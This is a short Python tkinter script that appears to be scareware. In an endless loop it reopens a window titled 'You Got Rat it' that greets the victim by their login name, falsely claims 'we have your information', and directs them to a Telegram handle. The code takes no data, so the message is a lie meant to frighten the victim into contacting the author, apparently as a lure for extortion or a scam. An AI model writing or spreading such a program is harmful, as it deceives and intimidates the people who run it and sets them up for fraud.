import tkinter as tk
from tkinter import *
import sys
import os
while True:
 name = os.getlogin()

 window = tk.Tk()
 window.title("You Got Rat it")
 window.geometry('520x300')
 owo = Label(window, text=f"hello {name} you got rat it,")
 owo.pack()
 uwu = Label(window, text="and we have your information come and talk with me add d0x1ed on telegram")
 uwu.pack()
 window.mainloop()
